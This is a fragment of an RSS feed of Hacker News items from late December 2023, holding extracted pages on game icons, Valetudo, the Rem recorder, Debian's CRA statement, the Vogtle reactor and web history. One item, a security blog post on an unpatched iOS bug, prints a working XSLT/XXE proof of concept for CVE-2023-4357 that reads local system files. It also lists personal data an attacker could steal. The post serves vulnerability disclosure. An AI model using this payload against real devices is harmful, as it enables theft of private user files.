src="https://game-icons.net/icons/ffffff/000000/1x1/skoll/fangs.svg" alt="Fangs icon" width="120" height="120"></a></p></li><li data-hint="Gold mine"><p><a href="https://game-icons.net/1x1/delapouite/gold-mine.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/delapouite/gold-mine.svg" alt="Gold mine icon" width="120" height="120"></a></p></li><li data-hint="Castle"><p><a href="https://game-icons.net/1x1/lorc/castle.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/castle.svg" alt="Castle icon" width="120" height="120"></a></p></li><li data-hint="Diamonds smile"><p><a href="https://game-icons.net/1x1/lorc/diamonds-smile.html"><img src="https://game-icons.net/icons/ffffff/000000/1x1/lorc/diamonds-smile.svg" alt="Diamonds smile icon" width="120" height="120"></a></p></li></ul><h2>About the project</h2><h3>An ever growing collection of free game icons</h3><p>Dozen new symbols are added weekly and organized in intuitive categories to offer both a comfy browsing and let room for serendipity.</p><p>Stay up to date by following <a href="https://twitter.com/GameIcons">the project on twitter</a> or just fetching the <a href="https://game-icons.net/feeds/icons.xml">RSS feed</a>.</p><h3>Easy styling thanks to SVG</h3><p>All the images are downloadable in a vector format, so <a href="https://game-icons.net/studio.html">you can easily tweak</a> colors, rotation, adjust effects like blur, bevels or shadows and add <a href="https://game-icons.net/badges.html">badges</a>.</p><p>Another direct benefit is infinite scaling with low <a href="https://game-icons.net/memory.html">memory</a>, it means no size limit for the resulting files which can be used for high resolution interfaces, retina display, logos, stencils etc...</p><h3>Community oriented</h3><p>People designing video games or enthusiasts crafting board games have different constraints and needs.</p><p>Let us know what they are on our <a href="https://github.com/game-icons/icons/issues">GitHub tracker</a>.</p><h3>Passion driven</h3><p>Made by <a href="https://game-icons.net/about.html#authors">guys</a> who care about delivering a neat experience, because they eat their own dog food.</p><p><a href="https://game-icons.net/about.html">Learn more...</a></p></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Breaking "DRM" in Polish trains [video] – 37c3 presentation (281 pts)]]></title>
            <link>https://streaming.media.ccc.de/37c3/relive/12142</link>
            <guid>38788360</guid>
            <pubDate>Wed, 27 Dec 2023 23:56:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://streaming.media.ccc.de/37c3/relive/12142">https://streaming.media.ccc.de/37c3/relive/12142</a>, See on <a href="https://news.ycombinator.com/item?id=38788360">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					<h3>Download</h3>
					<p>Click here to <a href="https://cdn.c3voc.de/relive/37c3/12142/muxed.mp4">Download</a> this Relive recording. Beware! This is an unprocessed streamdump – a final release will follow soon.</p>
				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Valetudo – Cloud replacement for vacuum robots enabling local-only operation (314 pts)]]></title>
            <link>https://valetudo.cloud/</link>
            <guid>38788326</guid>
            <pubDate>Wed, 27 Dec 2023 23:51:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://valetudo.cloud/">https://valetudo.cloud/</a>, See on <a href="https://news.ycombinator.com/item?id=38788326">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>

      <p>
  <h2>Free your vacuum from the cloud</h2>
</p>

<p>Valetudo is an opinionated software solution for cloud-free vacuum robots installed on thousands of robots.<br>
Since it was started in 2018, it has matured to a reliable fire-and-forget solution that just works.</p>

<p>Valetudo is made, managed, maintained and more by me,
<a href="https://hypfer.de/" rel="noopener" target="_blank">Sören Beye</a>, with occasional contributions by
<a href="https://github.com/Hypfer/Valetudo/graphs/contributors" rel="noopener" target="_blank">these awesome people</a>.<br>
It would not exist without the ongoing work of <a href="https://dontvacuum.me/" rel="noopener" target="_blank">Dennis Giese</a>,
who is constantly providing us with new ways of liberating and gaining actual ownership of our robots.</p>

<p>As there is no telemetry built-in and no commercial interest to change that, I can’t tell you how many users exactly are there,
however judging by download counts and support group members, I’d guesstimate that there are a few thousand.</p>

<p>If you want to learn more about why someone would want to use something like Valetudo, check out the <a href="https://valetudo.cloud/pages/general/why-valetudo.html">Why Valetudo?</a> page.</p>

<p>If you want to learn more about why someone would <strong>not</strong> want to use something like Valetudo, check out the <a href="https://valetudo.cloud/pages/general/why-not-valetudo.html">Why not Valetudo?</a> page.</p>

<p>To choose the right robot to buy, head over to <a href="https://valetudo.cloud/pages/general/buying-supported-robots.html">Buying supported robots</a>.</p>

<p>If you want to learn more about why I’m building Valetudo, the answer is actually pretty simple:<br>
When I was looking for a vacuum robot for myself, I didn’t find anything that matched what I was looking for.<br>
Thus, in a brief moment of hubris, I thought to myself: “How hard can it be?”.<br>
Now, four years later, we’re here and I’m quite happy with how it turned out.</p>

<p>Valetudo is licensed under the Apache-2.0 open-source license, because you need to be able to know what your smart
devices are doing and also alter (some parts of) it without being dependent on some vendor and/or third party.
The only way of truly achieving that is by being able to see and modify the code.</p>

<p>The Apache-2.0 license is a very permissive license and a lot of work is being shared for free here, so I trust people to not take
advantage of that and sell Valetudo; especially not as their own work.<br>
Please don’t disappoint me. Thank you.</p>

<p>These are the Valetudo Docs.
Simply use the navigation menu on the left to find what you’re looking for.</p>

<p>The <a href="https://valetudo.cloud/pages/general/getting-started.html">getting started guide</a> is a good place to start.</p>

<p>Also, make sure to check out the companion apps section.</p>

<h3 id="screenshots">Screenshots</h3>

<h3 id="phonemobile">Phone/Mobile</h3>
<p><img src="https://user-images.githubusercontent.com/974410/211155741-d6430660-a6b2-48ab-8ddc-2217328444de.png" width="360">
<img src="https://user-images.githubusercontent.com/974410/211155635-fdfb5b2b-2c3d-4a49-a0ed-a40deb04708f.png" width="360"></p>

<p><img src="https://user-images.githubusercontent.com/974410/211155650-7cac266c-ffeb-432d-8656-5241a5d6f227.png" width="360">
<img src="https://user-images.githubusercontent.com/974410/211155656-d43ee25e-1ae6-432f-95ff-1a39d294828d.png" width="360"></p>

<h3 id="tabletdesktop">Tablet/Desktop</h3>

<p><img src="https://user-images.githubusercontent.com/974410/211155726-4ca46998-717a-49b4-a7d0-45b0467cc10a.png" alt="image"></p>

<p><img src="https://user-images.githubusercontent.com/974410/211155836-9199616a-efde-4238-91c4-24158ba67677.png" alt="image"></p>

<p><img src="https://user-images.githubusercontent.com/974410/211155860-9926b126-d1fe-41b1-8c83-1af21bf8caf2.png" alt="image"></p>

<p><img src="https://user-images.githubusercontent.com/974410/211155880-ff184776-86fe-4c2f-9556-4d556cfa12f4.png" alt="image"></p>

<h3 id="further-questions">Further questions?</h3>
<p><a href="https://t.me/+Wlt6LOE82dMwNmQy">Valetudo Telegram group</a></p>

<h3 id="valetudo-is-a-garden-">Valetudo is a garden <a id="garden"></a></h3>
<p>This project is the hobby of some random guy on the internet. There is no intent to commercialize it, grow it
or expand the target audience of it. In fact, there is intent to explicitly not do that.</p>

<p>Think of Valetudo as a privately-owned public garden. You can visit it any time for free and enjoy it.
You can spend time there, and you can bring an infinite amount of friends with you to enjoy it.
You can walk the pathways built there. You can sit on some patch of grass and maybe watch a Duck or something.
You can leave a tip in the tip jar at the entrance if you really enjoy it and want to support it flourish.</p>

<p>You can take inspiration from it and bring that home to your own garden, giving it a personal twist and adapting it as needed.
You can even make friendly suggestions if you have a really good idea that ties into the vision that is already there.</p>

<p>But, at the end of the day, you must understand that it is still privately-owned. You’re on someone else’s property
over which you have no power at all. You will have to show the necessary respect. And - most importantly - you need to
understand that letting you into this garden is a gift and should be treated as such.</p>

<p>If you don’t like this garden because you don’t like how it’s structured, or you feel like it’s missing something, or maybe
I choose the wrong flowers to plant over there that’s fine. It’s just not for you then. You can leave at any time.</p>

<p>There is simply no ground to stand on to demand change to the garden. It doesn’t matter if it would attract more people
or if all the other gardens in town are doing something in a specific way. It doesn’t matter if your idea of what gardens
even are differs.<br>
This at the end of the day is simply private property with free public access as a gift to everyone.</p>

<p>When it comes to software development, <em>everyone</em> has access to infinite plots of undeveloped land that they can claim at any time.
Therefore, a garden being build with a specific vision does not take away the ability for anyone else to build their own garden with a different vision.</p>


      </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[No new iPhone? No secure iOS: Looking at an unfixed iOS vulnerability (272 pts)]]></title>
            <link>https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities</link>
            <guid>38788273</guid>
            <pubDate>Wed, 27 Dec 2023 23:43:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities">https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities</a>, See on <a href="https://news.ycombinator.com/item?id=38788273">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
  <p>What’s the deal with iOS security updates, anyway?</p>

<p>Not everybody can afford the newest and greatest Apple product. Luckily, Apple continues to support nearly-decade-old devices like the iPhone 6S, which and iOS 15.8 is still powering those devices, seemingly with official Apple support, with the latest update from <a href="https://support.apple.com/en-gb/109032">October the 25th, which addressed some security vulnerabilities</a>.</p>

<p>In reality, however, Apple seems to only be addressing <em>some</em> security issues in its older supported devices.</p>

<hr>

<p>On June the 28th, Chromium announced that it had patched a vulnerability titled <a href="https://chromereleases.googleblog.com/2023/08/stable-channel-update-for-desktop_15.html">“CVE-2023-4357: Insufficient validation of untrusted input in XML”</a>. In the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1458911">bug report</a> for that issue, it was shown that on various devices, Google Chrome’s Blink rendering engine could reveal the contents of arbitrary files: <code>/etc/passwd</code>, for example. Interestingly, this also included Chrome for iOS. Given that Apple forces all browsers in iOS to use the WebKit rendering engine, that meant this vulnerability not only affected Blink, but also WebKit.</p>

<hr>

<p>Taking that exploit from June:</p>

<p><code>exploit.svg</code>:</p>
<div><pre><code><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span>&lt;?xml-stylesheet type="text/xsl" href="?#"?&gt;</span>
<span>&lt;xsl:stylesheet</span> <span>version=</span><span>"1.0"</span> <span>xmlns:xsl=</span><span>"http://www.w3.org/1999/XSL/Transform"</span><span>&gt;</span>

<span>&lt;xsl:template</span> <span>match=</span><span>"/"</span><span>&gt;</span>

<span>&lt;svg</span> <span>width=</span><span>"1000%"</span> <span>height=</span><span>"1000%"</span> <span>version=</span><span>"1.1"</span> <span>xmlns=</span><span>"http://www.w3.org/2000/svg"</span><span>&gt;</span>
<span>&lt;foreignObject</span> <span>class=</span><span>"node"</span> <span>font-size=</span><span>"18"</span> <span>width=</span><span>"100%"</span> <span>height=</span><span>"100%"</span><span>&gt;</span>
<span>&lt;body</span> <span>xmlns=</span><span>"http://www.w3.org/1999/xhtml"</span><span>&gt;</span>
<span>&lt;xmp&gt;&lt;xsl:copy-of</span> <span>select=</span><span>"document('exploit.php')"</span><span>/&gt;&lt;/xmp&gt;</span>
<span>&lt;/body&gt;</span>
<span>&lt;/foreignObject&gt;</span>
<span>&lt;/svg&gt;</span>

<span>&lt;/xsl:template&gt;</span>
<span>&lt;/xsl:stylesheet&gt;</span>
</code></pre></div>

<p><code>exploit.php</code>:</p>
<div><pre><code><span>&lt;?php</span> <span>header</span><span>(</span><span>"Access-Control-Allow-Origin: *"</span><span>);</span><span>?&gt;</span>
<span>&lt;!DOCTYPE p [
&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;</span>
<span>&lt;</span><span>!</span><span>ENTITY</span> <span>hosts</span> <span>SYSTEM</span> <span>"</span><span>file:</span><span>///</span><span>etc</span><span>/</span><span>hosts</span><span>"</span><span>&gt;</span>
<span>&lt;</span><span>!</span><span>ENTITY</span> <span>group</span> <span>SYSTEM</span> <span>"</span><span>file:</span><span>//</span><span>localhost</span><span>/</span><span>etc</span><span>/</span><span>group</span><span>"</span><span>&gt;</span>
]&gt;
<span>&lt;p&gt;</span>

<span>&lt;p</span> <span>style=</span><span>"border-style: dotted;"</span><span>&gt;</span>/etc/passwd:
<span>&amp;passwd;</span>
<span>&lt;/p&gt;</span>
<span>&lt;p</span> <span>style=</span><span>"border-style: dotted;"</span><span>&gt;</span>/etc/hosts:

<span>&amp;hosts;</span>
<span>&lt;/p&gt;</span>
<span>&lt;p</span> <span>style=</span><span>"border-style: dotted;"</span><span>&gt;</span>/etc/group:

<span>&amp;group;</span>
<span>&lt;/p&gt;</span>

<span>&lt;/p&gt;</span>
</code></pre></div>

<p>Aand trying it on the latest version of iOS that the (supported) iPhone 6S, we indeed see that the exploit <em>still</em> works. When opening the page, your <code>/etc/passwd</code> is there for the world to see.</p>

<p>That means that any website visited by anybody using an iPhone 6S (or possibly later versions) can silently steal internal system files. What files could somebody steal? Well, there’s always:</p>

<ul>
  <li>AddressBook.sqlitedb: which contains all of the personal contact information of the user and any saved contacts.</li>
  <li>call_history.db: which contains all received, dialled, and missed calls of the user.</li>
  <li>SMS/call_history.db: which contains the SMS history of the user.</li>
</ul>

<p>Or maybe:</p>
<ul>
  <li>History.plist: which contains the browsing history of the user.</li>
  <li>Cookies.plist: which contains the browser’s cookies – including authentication cookies, which an attacker can re-use once they are stolen.</li>
</ul>

<hr>

<p>After contacting Apple to see whether they intended to patch this, the response was quite short: <code>If in the future you are able to reproduce this issue using a different device that's running iOS 17 or later, please let us know.</code></p>

<p>This raises some interesting questions. First off, does it imply that Apple does not patch vulnerabilities in older versions of iOS unless they may used to root/jailbreak the iPhone, or are known to be actively being either mass-exploited or exploited by some nation-state?</p>

<p>A <a href="https://github.com/skysafe/reblog/tree/main/cve-2023-45866">new exploit targeting the iOS</a> (among other OS’) Bluetooth stack has also been <a href="https://support.apple.com/en-us/HT214035">left unpatched by Apple in all versions except iOS 17</a>.</p>

<p>If I was an exploit vendor, I would be paying very close attention to vulnerabilities fixed in iOS 17, and seeing whether they work on previous (supported) iOS versions. Not every target has the newest Apple device, and minimal amount of surveillance may save the vendor from burning a 0day on a target that is using a slightly older device.</p>

<hr>

<p>Note: I haven’t tested this against older (supported) MacOS versions, but it’s definitely possible that Safari is exploitable here, too.</p>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Rem: Remember Everything (open source) (248 pts)]]></title>
            <link>https://github.com/jasonjmcghee/rem</link>
            <guid>38787892</guid>
            <pubDate>Wed, 27 Dec 2023 22:56:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/jasonjmcghee/rem">https://github.com/jasonjmcghee/rem</a>, See on <a href="https://news.ycombinator.com/item?id=38787892">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/jasonjmcghee/rem/blob/main/rem/Assets.xcassets/AppIcon.appiconset/AppIcon128x128@2x.png"><img src="https://github.com/jasonjmcghee/rem/raw/main/rem/Assets.xcassets/AppIcon.appiconset/AppIcon128x128@2x.png" width="24"></a> rem</h2>
<p dir="auto">🧠 Remember everything.</p>
<a href="https://www.loom.com/share/091a48b318f04f22bdada62716298948" rel="nofollow">
  <img src="https://camo.githubusercontent.com/c52c9016b51ed5770681ad7189b3353b4a82508d9fdd0845852b99b4a9935fdc/68747470733a2f2f63646e2e6c6f6f6d2e636f6d2f73657373696f6e732f7468756d626e61696c732f30393161343862333138663034663232626461646136323731363239383934382d776974682d706c61792e676966" data-animated-image="" data-canonical-src="https://cdn.loom.com/sessions/thumbnails/091a48b318f04f22bdada62716298948-with-play.gif">
</a>
<p dir="auto">An open source approach to locally record everything you view on your Apple Silicon computer.</p>
<p dir="auto"><em>Note: Only tested on Apple Silicon, and the release is Apple Silicon.</em></p>
<p dir="auto">I think the idea of recording everything you see has the potential to change how we interact
with our computers, and believe it should be open source.</p>
<p dir="auto">Also, from a privacy / security perspective, this is like... pretty scary stuff, and I want the code open
so we know for certain that nothing is leaving your laptop. Even logging to Sentry has the potential to
leak private info.</p>
<p dir="auto">This is 100% local. Please, read the code yourself.</p>
<h3 tabindex="-1" dir="auto">This is crazy alpha version</h3>
<p dir="auto">I wrote this in a couple days over the holidays, and if there's one takeaway, it's that I'm a
complete novice at Swift.</p>
<h2 tabindex="-1" dir="auto">Getting Started</h2>
<ul dir="auto">
<li>Launch the app</li>
<li>Click the brain</li>
<li>Click "Start Remembering"</li>
<li>Grant it access to "Screen Recording" i.e. take screenshots every 2 seconds</li>
<li>Click "Open timeline" or "Cmd + Scroll Up" to open the timeline view
<ul dir="auto">
<li>Scroll left or right to move in time</li>
</ul>
</li>
<li>Click "Search" to open the search view
<ul dir="auto">
<li>Search your history and click on a thumbnail to go there in the timeline</li>
</ul>
</li>
<li>In timeline, give Live Text a second and then you can select text</li>
<li>Click "Copy Recent Context" to grab a prompt for interacting with an LLM with what you've seen recently as context</li>
<li>Click "Purge All Data" to delete everything (useful if something breaks)</li>
</ul>
<h2 tabindex="-1" dir="auto">Current supports:</h2>
<ul dir="auto">
<li>Going back in time (full-screen scrubber of everything you've viewed)</li>
<li>Copy text from back in time</li>
<li>Search everything you've viewed</li>
<li>Easily grab recent context for use with LLMs</li>
</ul>
<h2 tabindex="-1" dir="auto">Things I'd love to add:</h2>
<ul dir="auto">
<li>Natural language search / agent interaction via updating local vector embedding
<ul dir="auto">
<li><a href="https://github.com/jasonjmcghee/portable-hnsw">I've also been exploring novel approaches to vector dbs</a></li>
</ul>
</li>
<li>Multi-monitor support</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Debian Statement on the Cyber Resilience Act (160 pts)]]></title>
            <link>https://lwn.net/Articles/956187/</link>
            <guid>38787005</guid>
            <pubDate>Wed, 27 Dec 2023 21:32:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lwn.net/Articles/956187/">https://lwn.net/Articles/956187/</a>, See on <a href="https://news.ycombinator.com/item?id=38787005">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>
The Debian project has <a href="https://www.debian.org/vote/2023/vote_002">completed a
general-resolution vote</a>, adopting a statement expressing concern about
the Cyber Resilience Act (CRA) pending in the European Union.
</p><blockquote>
	Even if only "commercial activities" are in the scope of CRA, the
	Free Software community - and as a consequence, everybody - will
	lose a lot of small projects. CRA will force many small enterprises
	and most probably all self employed developers out of business
	because they simply cannot fulfill the requirements imposed by
	CRA. Debian and other Linux distributions depend on their work. If
	accepted as it is, CRA will undermine not only an established
	community but also a thriving market. CRA needs an exemption for
	small businesses and, at the very least, solo-entrepreneurs
</blockquote><br clear="all"><hr><p>
           (<a href="https://lwn.net/Login/?target=/Articles/956187/">Log in</a> to post comments)
           </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[3D Map of Shinjuku Station in Three.js (670 pts)]]></title>
            <link>https://satoshi7190.github.io/Shinjuku-indoor-threejs-demo/</link>
            <guid>38786581</guid>
            <pubDate>Wed, 27 Dec 2023 20:50:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://satoshi7190.github.io/Shinjuku-indoor-threejs-demo/">https://satoshi7190.github.io/Shinjuku-indoor-threejs-demo/</a>, See on <a href="https://news.ycombinator.com/item?id=38786581">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p><span>「新宿駅周辺屋内地図データ」（国土交通省）（<a href="https://www.geospatial.jp/ckan/dataset/mlit-indoor-shinjuku-r2" ,="" target="_blank" rel="noopener noreferrer">https://www.geospatial.jp/ckan/dataset/mlit-indoor-shinjuku-r2</a>）を加工して作成</span>
        </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[First new U.S. nuclear reactor since 2016 is now in operation (713 pts)]]></title>
            <link>https://www.eia.gov/todayinenergy/detail.php?id=61106</link>
            <guid>38785468</guid>
            <pubDate>Wed, 27 Dec 2023 19:19:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eia.gov/todayinenergy/detail.php?id=61106">https://www.eia.gov/todayinenergy/detail.php?id=61106</a>, See on <a href="https://news.ycombinator.com/item?id=38785468">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                <p><span>December 26, 2023</span></p>
                                    










<p>From December 18 to January 1, <em>Today in Energy</em> will feature some of our favorite articles from 2023. Today’s article was originally published on August 1.</p>

<p><img src="https://www.eia.gov/todayinenergy/images/2023.08.01/main.svg" alt="U.S. nuclear power capacity additions"></p><p><span>
<strong>Data source: </strong>U.S. Energy Information Administration, <a href="https://www.eia.gov/electricity/data/eia860m/"><em>Preliminary Monthly Electric Generator Inventory</em></a>, and Georgia Power press release<br><strong>Note: </strong>Data excludes capacity built and retired before 2002.
	
</span></p>
<hr>


<p>A new reactor at Georgia’s Vogtle nuclear power plant is now in commercial operation, according to an <a href="https://www.georgiapower.com/company/news-center/2023-articles/vogtle-unit-3-goes-into-operation.html">announcement from Georgia Power</a>, one of the plant’s owners. It is the first new nuclear reactor to start up in the United States since the Tennessee Valley Authority’s Watts Bar 2 was commissioned in 2016.    </p>
	
     
	
<p>The new 1,114 megawatt (MW) Unit 3 reactor joins two existing reactors at Plant Vogtle, which is jointly owned by Georgia Power and three other electric utility companies. The plant’s first two reactors, with a combined 2,430 MW of <a href="https://www.eia.gov/tools/glossary/index.php?id=Generator%20nameplate%20capacity">nameplate capacity</a>, came online in the late 1980s. Georgia Power expects another similar-sized fourth reactor, Vogtle Unit 4, <a href="https://www.georgiapower.com/company/news-center/2023-articles/hot-functional-testing-completed-for-vogtle-unit-4.html#:~:text=Unit%204%20is%20projected%20to,or%20the%20first%20quarter%202024.">to begin operation</a> sometime between November 2023 and March 2024. The two new reactors will make Plant Vogtle the largest nuclear power plant in the country, surpassing the 4,210 MW Palo Verde plant in Arizona. </p>

<p>Construction at the two new reactor sites <a href="https://www.augustachronicle.com/story/business/2009/11/22/stub-984/14385703007/">began in 2009</a>. Originally expected to cost $14 billion and begin commercial operation in 2016 (Vogtle 3) and 2017 (Vogtle 4), the project ran into significant construction delays and cost overruns. The total cost of the project is now <a href="https://apnews.com/article/georgia-power-co-southern-climate-and-environment-business-3b1d6c65353c6a65b1ccfddede753ab7">estimated at more than $30 billion</a>. </p>

<p>Both Vogtle Units 3 and 4 use a new reactor design, the Westinghouse <a href="https://www.westinghousenuclear.com/energy-systems/ap1000-pwr">AP1000</a>. This next generation advanced reactor has a smaller footprint and simpler design than previous generation reactor technologies. It also features robust <a href="https://www.westinghousenuclear.com/energy-systems/ap1000-pwr/safety/passive-safety-systems">passive safety systems</a> that can shut down the reactor without any operator action or external power source. Units 3 and 4 are the first U.S. deployment of the AP1000 Generation III+ reactor. Two other Westinghouse AP1000 reactors were planned for a nuclear power plant in South Carolina, but <a href="https://www.eia.gov/todayinenergy/detail.php?id=32472#:~:text=South%20Carolina%20Electric%20%26%20Gas%20Company,Summer%20nuclear%20power%20plant.">construction was halted</a> in 2017. </p>

<p>The <a href="https://www.energy.gov/management/december-23-1957-shippingport">first commercial nuclear power reactor</a> in the United States came online in December 1957 in Shippingport, Pennsylvania. Most U.S. nuclear reactors were <a href="https://www.eia.gov/todayinenergy/detail.php?id=30972#:~:text=Of%20the%2099%20gigawatts%20(GW,online%20between%201970%20and%201990.">built in the 20-year period from 1970 to 1990</a>. Prior to Vogtle Unit 3, the last nuclear reactor to start in the United States was <a href="https://www.eia.gov/todayinenergy/detail.php?id=26652">Watts Bar Unit 2</a> in Tennessee. Construction on Watts Bar 2 began in 1973 but was suspended in 1985. Work resumed in 2007, and the reactor came online in 2016. </p>

<p>With 95,881 MW of nuclear power capacity at 93 operating commercial reactors, the United States has more nuclear capacity than any other country. Nuclear power plants produce nearly 20% of the country’s electricity. </p>

<p>Although a number of nuclear reactors have retired in recent years, there has been <a href="https://www.economist.com/united-states/2023/06/25/america-aims-for-nuclear-power-renaissance">interest</a> in nuclear power as an energy resource to help reduce the carbon footprint of the U.S. electric power sector. Generation from nuclear reactors doesn’t produce CO<sub>2</sub> emissions and can provide essential baseload power that would otherwise largely come from coal- and natural gas-fired plants. </p>

<p>Recent legislation, such as the Bipartisan Infrastructure Law and the Inflation Reduction Act, supports U.S. nuclear energy as part of a clean energy, zero-carbon generating portfolio.</p>
	
<p><strong>Principal contributors: </strong>Elesia Fasching, Tyler Hodge, Slade Johnson</p>
	





                                                                        
              </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Web Development History – Internet history for the technically curious (107 pts)]]></title>
            <link>https://webdevelopmenthistory.com/index/</link>
            <guid>38785317</guid>
            <pubDate>Wed, 27 Dec 2023 19:04:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://webdevelopmenthistory.com/index/">https://webdevelopmenthistory.com/index/</a>, See on <a href="https://news.ycombinator.com/item?id=38785317">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="container">

		<p><a href="#content">Skip to content</a></p><!-- .skip-link -->

		<header id="header">
			<div id="branding">

									<!-- Site title and logo -->
		<a href="https://webdevelopmenthistory.com/"><p><img src="https://webdevelopmenthistory.com/wp-content/uploads/2020/11/wdh_logo2.png" alt="Web Development History"></p>
		<div>
				<p id="site-title">Web Development History</p>				<p id="site-description">Internet history for the technically curious</p>			</div>
		</a>
		
						
	<nav id="menu-primary" aria-label="Primary Menu">

		<!-- Mobile menu toggle button (hamburger/x icon) -->
		

		<ul id="menu-primary-items" aria-expanded="false"><li id="menu-item-50"><a href="https://webdevelopmenthistory.com/">Home</a></li>
<li id="menu-item-2137"><a href="https://webdevelopmenthistory.com/about/">About</a></li>
<li id="menu-item-2341"><a href="https://webdevelopmenthistory.com/index/" aria-current="page">Index</a></li>
<li id="menu-item-2946"><a href="https://webdevelopmenthistory.com/timeline/">Timeline</a></li>
</ul>
	</nav><!-- #menu-primary -->

	
					</div><!-- #branding -->
		</header><!-- #header -->

<div id="main">
			
			
			<main id="content">

				
				
					
						
						<article id="post-2339" class="page">

	
		<header>
        				
		</header><!-- .entry-header -->

		<div itemprop="text">
			
<p>This page is a topical index of WDH posts. There is also a <a href="https://webdevelopmenthistory.com/timeline/">chronological timeline</a>, if you prefer that approach. </p>



<h2>WWW Beginnings</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1990-programming-the-world-wide-web/">1990: Programming the World Wide Web</a></li><li><a href="https://webdevelopmenthistory.com/1991-tim-berners-lee-trys-to-convert-the-hypertext-faithful/">1991: Tim Berners-Lee Tries to Convert the Hypertext Faithful</a></li><li><a href="https://webdevelopmenthistory.com/1992-web-vs-gopher/">1992: The Web vs Gopher, and the First External Browsers</a></li><li><a href="https://webdevelopmenthistory.com/1993-mosaic-launches-and-the-web-is-set-free/">1993: Mosaic Launches and the Web is Set Free</a></li></ul>



<h2>Server-Side</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1993-cgi-scripts-and-early-server-side-web-programming/">1993: CGI Scripts and Early Server-Side Web Programming</a></li><li><a href="https://webdevelopmenthistory.com/1994-perl-yahoo/">1994: How Perl Became the Foundation of Yahoo</a></li><li><a href="https://webdevelopmenthistory.com/1995-php-quietly-launches-as-a-cgi-scripts-toolset/">1995: PHP Quietly Launches as a CGI Scripts Toolset</a></li><li><a href="https://webdevelopmenthistory.com/1995-apache-microsoft-iis-web-server-market/">1995: Apache and Microsoft IIS Shake Up the Web Server Market</a></li><li><a href="https://webdevelopmenthistory.com/1995-mysql-lamp-stack/">1995: MySQL Arrives, Completing the LAMP Stack</a></li></ul>



<h2>Client-Side</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1995-the-birth-of-javascript/">1995: The Birth of JavaScript</a></li><li><a href="https://webdevelopmenthistory.com/1996-javascript-annoyances-and-meeting-the-dom/">1996: JavaScript Annoyances and Meeting the DOM</a></li><li><a href="https://webdevelopmenthistory.com/1996-flash-css-web-design/">1996: Flash and CSS Bring Design to the Web</a></li><li><a href="https://webdevelopmenthistory.com/1997-javascript-apps-dynamic-web/">1997: JavaScript Grows Up and Developers Push the Boundaries</a></li><li><a href="https://webdevelopmenthistory.com/1997-the-year-of-dhtml/">1997: The Year of DHTML</a></li></ul>



<h2>Browser Wars 1</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1996-netscape-lays-the-groundwork-for-web-applications/">1996: Netscape Lays the Groundwork For Web Applications</a></li><li><a href="https://webdevelopmenthistory.com/1996-microsoft-activates-the-internet-with-activex-jscript/">1996: Microsoft Activates the Internet With ActiveX &amp; JScript</a></li><li><a href="https://webdevelopmenthistory.com/1997-netscape-crossware-vs-the-windows-web/">1997: Netscape Crossware vs the Windows Web</a></li><li><a href="https://webdevelopmenthistory.com/1998-mozilla-w3c-dom-wasp/">1998: Open Season with Mozilla, W3C’s DOM, and WaSP</a></li><li><a href="https://webdevelopmenthistory.com/1999-the-fall-of-netscape-and-the-rise-of-mozilla/">1999: The Fall of Netscape and the Rise of Mozilla</a></li></ul>



<h2>Pre-History</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1968-the-mother-of-all-demos/">1968: The Mother of All Demos</a></li><li><a href="https://webdevelopmenthistory.com/1969-building-the-on-line-system/">1969: Building the oN-Line System</a></li><li><a href="https://webdevelopmenthistory.com/the-first-web-developer/">The Time I Met Bill English</a></li></ul>
					</div><!-- .entry-content -->

		<!-- .entry-footer -->

	
</article><!-- .entry -->

						
							
						
					
					
				
			</main><!-- #content -->

			
			
	<!-- #sidebar-primary -->

		</div><!-- #main -->



		


<!-- #footer -->

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HyperRogue, a open-source non-Euclidean roguelike: new weapons (143 pts)]]></title>
            <link>http://zenorogue.blogspot.com/2023/12/hyperrogue-130.html</link>
            <guid>38784817</guid>
            <pubDate>Wed, 27 Dec 2023 18:20:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://zenorogue.blogspot.com/2023/12/hyperrogue-130.html">http://zenorogue.blogspot.com/2023/12/hyperrogue-130.html</a>, See on <a href="https://news.ycombinator.com/item?id=38784817">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-5726842474839147375" itemprop="description articleBody"><p>
